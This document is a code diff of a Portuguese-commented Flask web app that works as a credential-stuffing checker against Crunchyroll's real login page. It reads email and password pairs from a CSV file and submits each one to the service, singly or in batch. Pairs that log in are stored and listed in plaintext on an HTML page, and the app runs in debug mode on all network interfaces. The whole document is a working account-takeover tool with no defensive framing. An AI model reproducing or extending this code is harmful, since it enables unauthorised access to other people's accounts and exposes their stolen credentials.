@@ -1,84 +1,86 @@
-from flask import Flask, jsonify, request
+from flask import Flask, request, jsonify, render_template_string
 import pandas as pd
 import requests
-import logging
 
 app = Flask(__name__)
 
-# Configuração do logging para salvar os logs em um arquivo
-logging.basicConfig(filename='login_logs.txt',  
-                    level=logging.INFO,        
-                    format='%(asctime)s - %(levelname)s - %(message)s')  
+# Dados CSV simulados (para o exemplo). No Replit, use um CSV real.
+csv_file = 'dados2.csv'
+tabela = pd.read_csv(csv_file)
 
-# Lista para armazenar e-mails de usuários já testados com sucesso
-usuarios_testados = set()
+# URL do site para login
+login_url = 'https://sso.crunchyroll.com/pt-br/login?return_url=%2Fauthorize%3Fclient_id%3Dnoaihdevm_6iyg0a8l0q%26redirect_uri%3Dhttps%3A%2F%2Fwww.crunchyroll.com%2Fcallback%26response_type%3Dcookie%26state%3D%252F'
 
-# URL da página de login
-url_login = "https://sso.crunchyroll.com/pt-br/login"
-url_check = "https://www.crunchyroll.com/"  # URL para verificar o login
+# Lista para armazenar as contas com login bem-sucedido
+contas_validas = []
 
-tabela = pd.read_csv('dados2.csv')
-
-def realizar_login(email: str, senha: str):
-    session = requests.Session()
-
-    # Simulação do payload enviado para login
-    payload = {
-        'email': email,
-        'password': senha
-    }
-
-    # Tenta realizar o login
-    response = session.post(url_login, data=payload)
-
-    # Verifica o status de login
-    if response.ok and session.get(url_check).url != url_login:
-        return True  # Login bem-sucedido
-    return False  # Login falhou
-
-@app.route("/login", methods=["POST"])
+@app.route('/login', methods=['POST'])
 def login():
     data = request.get_json()
-    email = data.get("email")
-    senha = data.get("senha")
-
-    if not email or not senha:
-        return jsonify({"error": "Email e senha são necessários"}), 400
-
-    if email in usuarios_testados:
-        return jsonify({"error": "Usuário já logado com sucesso anteriormente"}), 400
-
-    sucesso = realizar_login(email, senha)
-    if sucesso:
-        usuarios_testados.add(email)
-        logging.info(f"Login bem-sucedido para o e-mail: {email}")
+    email = data.get('email')
+    senha = data.get('senha')
+    
+    # Simulação de requisição de login (substitua pelos parâmetros reais)
+    response = requests.post(login_url, data={'email': email, 'password': senha})
+    
+    if response.ok and response.url != login_url:
+        contas_validas.append({'email': email, 'senha': senha})
         return jsonify({"status": "sucesso", "email": email})
     else:
-        logging.warning(f"Falha no login para o e-mail: {email}")
         return jsonify({"error": "Falha no login"}), 401
 
-@app.route("/login/batch", methods=["POST"])
-def login_batch():
-    tabela = pd.read_csv('dados2.csv')
+@app.route('/login/batch', methods=['POST'])
+def batch_login():
     resultados = []
-
-    for linha in tabela.index:
-        email = tabela.loc[linha, "email"]
-        senha = str(tabela.loc[linha, "senha"])
-
-        if email in usuarios_testados:
-            continue
-
-        sucesso = realizar_login(email, senha)
-        if sucesso:
-            usuarios_testados.add(email)
-            logging.info(f"Login bem-sucedido para o e-mail: {email}")
+    
+    for _, row in tabela.iterrows():
+        email = row['email']
+        senha = str(row['senha'])
+        
+        response = requests.post(login_url, data={'email': email, 'password': senha})
+        
+        if response.ok and response.url != login_url:
+            contas_validas.append({'email': email, 'senha': senha})
             resultados.append({"email": email, "status": "sucesso"})
         else:
-            logging.warning(f"Falha no login para o e-mail: {email}")
             resultados.append({"email": email, "status": "falha"})
-
+    
     return jsonify({"resultados": resultados})
 
+# Rota para exibir contas válidas
+@app.route('/contas_validas', methods=['GET'])
+def exibir_contas_validas():
+    # Template HTML simples para exibir as contas válidas
+    html_template = """
+    <!DOCTYPE html>
+    <html lang="pt-br">
+    <head>
+        <meta charset="UTF-8">
+        <title>Contas Válidas</title>
+    </head>
+    <body>
+        <h1>Contas com Login Bem-sucedido</h1>
+        {% if contas %}
+            <table border="1">
+                <tr>
+                    <th>Email</th>
+                    <th>Senha</th>
+                </tr>
+                {% for conta in contas %}
+                <tr>
+                    <td>{{ conta.email }}</td>
+                    <td>{{ conta.senha }}</td>
+                </tr>
+                {% endfor %}
+            </table>
+        {% else %}
+            <p>Nenhuma conta válida encontrada.</p>
+        {% endif %}
+    </body>
+    </html>
+    """
+    return render_template_string(html_template, contas=contas_validas)
+
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=8080, debug=True)
+
